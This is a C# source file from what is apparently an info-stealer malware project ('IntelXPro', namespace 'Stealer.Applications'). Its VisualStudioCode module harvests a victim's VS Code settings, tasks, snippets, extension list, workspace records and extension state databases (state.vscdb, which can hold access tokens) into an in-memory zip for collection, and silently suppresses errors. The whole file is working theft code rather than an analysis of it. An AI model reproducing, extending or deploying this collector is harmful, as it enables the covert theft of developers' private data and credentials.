using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class VisualStudioCode : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Code");
            string userProfilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".vscode");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "VisualStudioCode";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromDirectory(appDataPath, "AppData", zip, counterApplications);
            }

            if (Directory.Exists(userProfilePath))
            {
                foundData |= CollectFromDirectory(userProfilePath, "UserProfile", zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, string location, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string userPath = Path.Combine(basePath, "User");
                if (Directory.Exists(userPath))
                {
                    string[] configFiles = new string[]
                    {
                        "settings.json",
                        "keybindings.json",
                        "snippets",
                        "tasks.json",
                        "extensions.json",
                        "globalStorage\\storage.json"
                    };

                    foreach (string configFile in configFiles)
                    {
                        string fullPath = Path.Combine(userPath, configFile);
                        if (File.Exists(fullPath))
                        {
                            string zipPath = $"Applications\\VisualStudioCode\\{location}\\User\\{configFile.Replace("\\", "/")}";
                            zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                            counterApplications.Files.Add(fullPath + " => " + zipPath);
                            foundData = true;
                        }
                    }

                    string snippetsPath = Path.Combine(userPath, "snippets");
                    if (Directory.Exists(snippetsPath))
                    {
                        string[] snippetFiles = Directory.GetFiles(snippetsPath, "*.json", SearchOption.TopDirectoryOnly);
                        
                        foreach (string file in snippetFiles)
                        {
                            string fileName = Path.GetFileName(file);
                            string zipPath = $"Applications\\VisualStudioCode\\{location}\\User\\snippets\\{fileName}";
                            zip.AddFile(zipPath, File.ReadAllBytes(file));
                            counterApplications.Files.Add(file + " => " + zipPath);
                            foundData = true;
                        }
                    }

                    string globalStoragePath = Path.Combine(userPath, "globalStorage");
                    if (Directory.Exists(globalStoragePath))
                    {
                        string storageFile = Path.Combine(globalStoragePath, "storage.json");
                        if (File.Exists(storageFile))
                        {
                            string zipPath = $"Applications\\VisualStudioCode\\{location}\\User\\globalStorage\\storage.json";
                            zip.AddFile(zipPath, File.ReadAllBytes(storageFile));
                            counterApplications.Files.Add(storageFile + " => " + zipPath);
                            foundData = true;
                        }

                        string[] extensionDirs = Directory.GetDirectories(globalStoragePath, "*", SearchOption.TopDirectoryOnly);
                        
                        foreach (string extDir in extensionDirs.Take(10))
                        {
                            string extName = Path.GetFileName(extDir);
                            string stateFile = Path.Combine(extDir, "state.vscdb");
                            
                            if (File.Exists(stateFile))
                            {
                                string zipPath = $"Applications\\VisualStudioCode\\{location}\\User\\globalStorage\\{extName}\\state.vscdb";
                                zip.AddFile(zipPath, File.ReadAllBytes(stateFile));
                                counterApplications.Files.Add(stateFile + " => " + zipPath);
                                foundData = true;
                            }
                        }
                    }
                }

                string extensionsPath = Path.Combine(basePath, "extensions");
                if (Directory.Exists(extensionsPath))
                {
                    string[] extensionDirs = Directory.GetDirectories(extensionsPath, "*", SearchOption.TopDirectoryOnly);
                    
                    if (extensionDirs.Length > 0)
                    {
                        StringBuilder extensionsList = new StringBuilder();
                        extensionsList.AppendLine("Installed Extensions:");
                        extensionsList.AppendLine();
                        
                        foreach (string extDir in extensionDirs)
                        {
                            string extName = Path.GetFileName(extDir);
                            extensionsList.AppendLine("- " + extName);
                        }
                        
                        string zipPath = $"Applications\\VisualStudioCode\\{location}\\extensions_list.txt";
                        zip.AddTextFile(zipPath, extensionsList.ToString());
                        counterApplications.Files.Add(zipPath);
                        foundData = true;
                    }
                }

                string workspaceStoragePath = Path.Combine(basePath, "User", "workspaceStorage");
                if (Directory.Exists(workspaceStoragePath))
                {
                    string[] workspaceDirs = Directory.GetDirectories(workspaceStoragePath, "*", SearchOption.TopDirectoryOnly);
                    
                    foreach (string workspaceDir in workspaceDirs.Take(5))
                    {
                        string workspaceFile = Path.Combine(workspaceDir, "workspace.json");
                        if (File.Exists(workspaceFile))
                        {
                            string workspaceName = Path.GetFileName(workspaceDir);
                            string zipPath = $"Applications\\VisualStudioCode\\{location}\\workspaceStorage\\{workspaceName}\\workspace.json";
                            zip.AddFile(zipPath, File.ReadAllBytes(workspaceFile));
                            counterApplications.Files.Add(workspaceFile + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
